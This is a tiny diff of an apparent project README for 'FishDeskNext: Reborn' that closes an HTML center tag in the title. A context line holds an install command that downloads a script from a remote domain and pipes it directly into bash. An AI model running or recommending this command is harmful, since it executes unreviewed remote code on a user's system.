@@ -1,4 +1,4 @@
-# <center> FDNR - FishDeskNext: Reborn
+# <center> FDNR - FishDeskNext: Reborn </center>
 
 <center> curl tarikkochan.top/fdnr | bash
 
